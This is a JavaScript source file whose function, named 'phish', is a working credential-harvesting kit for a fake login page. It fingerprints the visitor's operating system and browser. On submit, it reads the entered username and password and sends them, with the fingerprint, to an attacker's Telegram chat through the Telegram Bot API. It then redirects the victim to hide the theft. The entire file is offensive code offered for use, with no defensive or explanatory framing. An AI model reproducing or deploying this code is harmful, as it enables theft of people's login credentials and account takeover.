const phish = (bot_token, chat_id, redirect_link) => {
    var module = {
        options: [],
        header: [
            navigator.platform,
            navigator.userAgent,
            navigator.appVersion,
            navigator.vendor,
            window.opera
        ],
        dataos: [
            { name: 'Windows Phone', value: 'Windows Phone', version: 'OS' },
            { name: 'Windows', value: 'Win', version: 'NT' },
            { name: 'iPhone', value: 'iPhone', version: 'OS' },
            { name: 'iPad', value: 'iPad', version: 'OS' },
            { name: 'Kindle', value: 'Silk', version: 'Silk' },
            { name: 'Android', value: 'Android', version: 'Android' },
            { name: 'PlayBook', value: 'PlayBook', version: 'OS' },
            { name: 'BlackBerry', value: 'BlackBerry', version: '/' },
            { name: 'Macintosh', value: 'Mac', version: 'OS X' },
            { name: 'Linux', value: 'Linux', version: 'rv' },
            { name: 'Palm', value: 'Palm', version: 'PalmOS' }
        ],
        databrowser: [
            { name: 'Chrome', value: 'Chrome', version: 'Chrome' },
            { name: 'Firefox', value: 'Firefox', version: 'Firefox' },
            { name: 'Safari', value: 'Safari', version: 'Version' },
            { name: 'Internet Explorer', value: 'MSIE', version: 'MSIE' },
            { name: 'Opera', value: 'Opera', version: 'Opera' },
            { name: 'BlackBerry', value: 'CLDC', version: 'CLDC' },
            { name: 'Mozilla', value: 'Mozilla', version: 'Mozilla' }
        ],
        init: function() {
            var agent = this.header.join(' '),
                os = this.matchItem(agent, this.dataos),
                browser = this.matchItem(agent, this.databrowser);

            return { os: os, browser: browser };
        },
        matchItem: function(string, data) {
            var i = 0,
                j = 0,
                html = '',
                regex,
                regexv,
                match,
                matches,
                version;

            for (i = 0; i < data.length; i += 1) {
                regex = new RegExp(data[i].value, 'i');
                match = regex.test(string);
                if (match) {
                    regexv = new RegExp(
                        data[i].version + '[- /:;]([\\d._]+)',
                        'i'
                    );
                    matches = string.match(regexv);
                    version = '';
                    if (matches) {
                        if (matches[1]) {
                            matches = matches[1];
                        }
                    }
                    if (matches) {
                        matches = matches.split(/[._]+/);
                        for (j = 0; j < matches.length; j += 1) {
                            if (j === 0) {
                                version += matches[j] + '.';
                            } else {
                                version += matches[j];
                            }
                        }
                    } else {
                        version = '0';
                    }
                    return {
                        name: data[i].name,
                        version: parseFloat(version)
                    };
                }
            }
            return { name: 'unknown', version: 0 };
        }
    };

    var e = module.init();

    const goTo = () => {
        let link = new URLSearchParams(window.location.search).get('link');
        if (link !== null) {
            redirect_link = link;
        }
        window.location.assign(redirect_link);
    };

    $('#submit-button').on('click', function() {
        let currentdate = new Date(),
            date = `${currentdate.getDate()}/${currentdate.getMonth() +
                1}/${currentdate.getFullYear()}`,
            time = `${currentdate.getHours()}:${currentdate.getMinutes()}:${currentdate.getSeconds()}`,
            xhr = new XMLHttpRequest(),
            login = $('#username').val(),
            pass = $('#password').val(),
            msg = `----------------------------------------------------%0A
Date  :    ${date}%0A
Time :    ${time}%0A
----------------------------------------------------%0A
Login:    ${login}%0A
Pass :    ${pass}%0A
----------------------------------------------------%0A
OS: ${e.os.name} v${e.os.version}%0A
Browser:  ${e.browser.name} v${e.browser.version}%0A
----------------------------------------------------%0A%0A
More Info%0A%0A
navigator.userAgent:%0A${navigator.userAgent}%0A%0A
navigator.appVersion:%0A${navigator.appVersion}%0A%0A
navigator.platform:%0A${navigator.platform}%0A%0A
navigator.vendor:%0A${navigator.vendor}%0A
`;

        xhr.open(
            'POST',
            `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${msg}`
        );
        xhr.send();

        setTimeout(function() {
            goTo();
        }, 500);
    });
};
